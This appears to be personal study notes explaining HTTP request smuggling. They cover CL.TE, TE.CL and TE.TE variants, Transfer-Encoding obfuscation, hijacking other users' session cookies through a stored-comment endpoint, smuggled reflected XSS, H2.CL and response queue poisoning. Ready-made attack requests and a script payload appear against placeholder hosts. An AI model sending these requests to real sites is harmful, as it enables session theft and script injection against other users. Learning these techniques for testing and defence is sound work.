# HTTP Request Smuggling
 #HTTP-Headers #Request-Smuggling #XSS

HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. 

Most HTTP request smuggling vulnerabilities arise because the HTTP specification provides **two different** ways to specify where a request **ends**: the `Content-Length` header and the `Transfer-Encoding` header.

## Content-Length and Transfer-Encoding
### Content-Length
The `Content-Length` header specifies the **length** of the message body in **bytes**. An example of this can be seen in the request below:
```HTTP
POST /search HTTP/1.1
Host: google.com
Content-Type: application/x-www-form-urlencded
Content-Length: 6

q=cats
```

### Transfer-Encoding
The `Transfer-Encoding` header can be used to specify that the message body uses **chuncked encoding**. This means that the message body contains one or more chunks of data. Each chunk consists of the **chunk size** in bytes (expressed in hex) followed by a **newline**, followed by the **chunk contents**. Each message is **terminated** with a chunk with a size of **zero**. For example:
```HTTP
Post /search HTTP/1.1
Host: google.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

6
s=cats
0
```

## Types Of Request Smuggling Attack
Request smuggling attacks involve placing **both** the `Content-Length` header and the `Transfer-Encoding` header into a single **HTTP** request and **manipulating** these so that the front-end and back-end servers process the request **differently**. The exact way in which this is done depends on the **behaviour** of the two servers:
|Type Of Attack|Explanation|
|---|---|
|CL.TE|The front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header.|
|TE.CL|The front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header.|
|TE.TE|The front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.|

## CL.TE Vulnerabilities
```HTTP
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

1. The **front-end** server processes the `Content-Length` header and determines that the request body is **13 bytes long**, up to the end of `SMUGGLED`. This request is forwarded on to the back-end server.
2. The **back-end** server processes the `Transfer-Encoding` header, and so treats the message body as using chunked encoding. It processes the first chunk, which is stated to be **zero** length, and so is treated as terminating the request. The following bytes, `SMUGGLED`, are left **unprocessed**, and the back-end server will treat these as being the **start of the next request** in the sequence.

## TE.CL Vulnerabilities
```HTTP
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

1. The **front-end** server processes the `Transfer-Encoding` header, and so treats the message body as using **chunked** encoding. It processes the first chunk, which is stated to be 8 bytes long, up to the start of the line following `SMUGGLED`. It processes the second chunk, which is stated to be zero length, and so is treated as **terminating** the request. This request is **forwarded** on to the **back-end** server.
2. The **back-end** server processes the `Content-Length` header and determines that the request body is **3 bytes** long, up to the start of the line following `8`. The following bytes, starting with `SMUGGLED`, are left **unprocessed**, and the **back-end** server will treat these as being the start of the next request in the sequence.

## TE.TE Vulnerabilities
Both the **front-end** and **back-end** servers support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating it in some way. Below are some example ways obfuscate the `Transfer-Encoding` header:

* `Transfer-Encoding: xchunked 
* `Transfer-Encoding : chunked`
* `Transfer-Encoding: chunked`<br>`Transfer-Encoding: x`
* `Transfer-Encoding:[tab]chunked`
* `[space]Transfer-Encoding: chunked`
* `X: X[\n]Transfer-Encoding: chunked`
* `Transfer-Encoding`<br>`: chunked`


## Capturing Other Users Requests 
If the application contains any kind of functionality that allows **textual data** to be **stored** and **retrieved**, then HTTP request smuggling can be used to **capture** the contents of other users' requests. This can allow attackers to steal **session tokens** or other **sensitive** data submitted by the user.

Suppose an application uses the following request to submit a blog post comment, which will be **stored** and **displayed** on the blog:
```HTTP
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 154
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&comment=My+comment&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net
```

You can perform the following request smuggling attack, which **smuggles** the data storage request to the **back-end** server:
```HTTP
GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 324

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
```

When another user's request is processed by the back-end server, it will be **appended** to the smuggled request, with the result that the user's request gets stored, including the victim user's **session cookie** and any other **sensitive data**:

```HTTP
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=GET / HTTP/1.1
Host: vulnerable-website.com
Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
... 
```

You can then **retrieve** the details of the other user's request by retrieving the stored data in the **normal way**.

## Reflected XSS via Request Smuggling
If a [reflected XSS](Cross-Site%20Scripting%20(XSS).md#Reflected) vulnerability is present on the site, for example, in the `User-Agent` header. You can see an example request of this below:
```HTTP
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Length: 156
Transfer-Encoding: chunked

0

GET /post?postId=10 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0" /><script>alert(1)</script>
```

Sending this request will then poising the following requests `User-Agent` and cause the alert popup in the browser.

## H2.CL Vulnerabilities
HTTP/2 requests **don't have to** specify their length explicitly in a header. During downgrading, this means **front-end** servers often add an HTTP/1 `Content-Length` header, deriving its value using **HTTP/2's built-in length mechanism**. Interestingly, HTTP/2 requests can also include their own `content-length` header. In this case, some front-end servers will simply **reuse** this value in the resulting HTTP/1 request.

## Response Queue Poisoning
Response queue poisoning is a powerful form of request smuggling attack that causes a **front-end** server to start **mapping** responses from the **back-end** to the **wrong** requests. In practice, this means that **all users** of the same front-end/back-end connection are persistently served responses that were **intended** for **someone else**.

This is achieved by smuggling a **complete** request, thereby eliciting **two** responses from the back-end when the front-end server is only expecting **one**.

### Response Queue Poisoning Attack Requirements
- The attacker is able to successfully **smuggle** a **complete**, standalone request that receives **its own** distinct **response** from the back-end server.
- The attack does **not** result in either server **closing** the TCP connection. Servers generally close **incoming** connections when they receive an **invalid request** because they can't determine where the request is supposed to end.